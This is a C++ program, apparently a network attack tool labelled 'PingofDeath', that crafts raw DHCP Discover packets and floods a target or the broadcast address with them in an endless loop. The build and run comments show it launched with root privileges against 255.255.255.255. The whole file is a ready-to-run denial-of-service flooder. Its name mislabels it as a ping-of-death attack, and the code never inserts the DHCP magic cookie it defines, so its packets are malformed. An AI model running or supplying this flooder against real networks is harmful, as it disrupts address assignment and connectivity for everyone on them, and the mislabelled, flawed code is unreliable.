#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>

// DHCP Packet Structure
struct dhcp_packet {
    uint8_t  op;       // Message opcode/type
    uint8_t  htype;    // Hardware address type
    uint8_t  hlen;     // Hardware address length
    uint8_t  hops;     // Number of hops
    uint32_t xid;      // Transaction ID
    uint16_t secs;     // Seconds elapsed
    uint16_t flags;    // Flags
    uint32_t ciaddr;   // Client IP address
    uint32_t yiaddr;   // Your IP address
    uint32_t siaddr;   // Server IP address
    uint32_t giaddr;   // Gateway IP address
    uint8_t  chaddr[16]; // Client hardware address
    uint8_t  sname[64]; // Server host name
    uint8_t  file[128]; // Boot file name
    uint8_t  options[312]; // Optional parameters
};

// Define DHCP options
#define DHCP_MAGIC_COOKIE 0x63825363
#define DHCP_OPTION_MESSAGE_TYPE 53
#define DHCP_MESSAGE_DISCOVER 1
#define DHCP_OPTION_END 255

// Calculate UDP checksum
uint16_t calculate_checksum(uint16_t *data, int length) {
    uint32_t sum = 0;
    while (length > 1) {
        sum += *data++;
        length -= 2;
    }
    if (length) {
        sum += *(uint8_t *)data;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

// Create and send DHCP packet
void send_dhcp_discover(const char* target_ip) {
    while (true)
    {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sockfd < 0) {
            perror("Socket creation failed");
            exit(EXIT_FAILURE);
        }

        struct sockaddr_in dest_addr;
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(67); // DHCP server port
        dest_addr.sin_addr.s_addr = inet_addr(target_ip);

        // Create DHCP packet
        dhcp_packet dhcp;
        memset(&dhcp, 0, sizeof(dhcp));

        dhcp.op = 1; // BOOTREQUEST
        dhcp.htype = 1; // Ethernet
        dhcp.hlen = 6; // MAC address length
        dhcp.xid = htonl(0x3903F326); // Random transaction ID
        dhcp.flags = htons(0x8000); // Broadcast flag
        dhcp.options[0] = DHCP_OPTION_MESSAGE_TYPE;
        dhcp.options[1] = 1; // Length of DHCP option
        dhcp.options[2] = DHCP_MESSAGE_DISCOVER;
        dhcp.options[3] = DHCP_OPTION_END;

        // Build UDP header
        struct udphdr udp;
        memset(&udp, 0, sizeof(udp));
        udp.source = htons(68); // DHCP client port
        udp.dest = htons(67);   // DHCP server port
        udp.len = htons(sizeof(udp) + sizeof(dhcp));
        udp.check = 0; // No checksum for simplicity

        // Build IP header
        struct iphdr ip;
        memset(&ip, 0, sizeof(ip));
        ip.ihl = 5;
        ip.version = 4;
        ip.tot_len = htons(sizeof(ip) + sizeof(udp) + sizeof(dhcp));
        ip.ttl = 64;
        ip.protocol = IPPROTO_UDP;
        ip.saddr = inet_addr("0.0.0.0"); // DHCP client address
        ip.daddr = dest_addr.sin_addr.s_addr;

        // Send the packet
        char packet[sizeof(ip) + sizeof(udp) + sizeof(dhcp)];
        memcpy(packet, &ip, sizeof(ip));
        memcpy(packet + sizeof(ip), &udp, sizeof(udp));
        memcpy(packet + sizeof(ip) + sizeof(udp), &dhcp, sizeof(dhcp));

        if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("Send failed");
            close(sockfd);
            exit(EXIT_FAILURE);
        }

        std::cout << "DHCP Discover packet sent to " << target_ip << std::endl;

        close(sockfd);
    }
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <target_ip>" << std::endl;
        return EXIT_FAILURE;
    }

    const char* target_ip = argv[1];
    send_dhcp_discover(target_ip);

    return EXIT_SUCCESS;
}
// g++ -o PingofDeath PingofDeath.cpp
// sudo ./PingofDeath 255.255.255.255
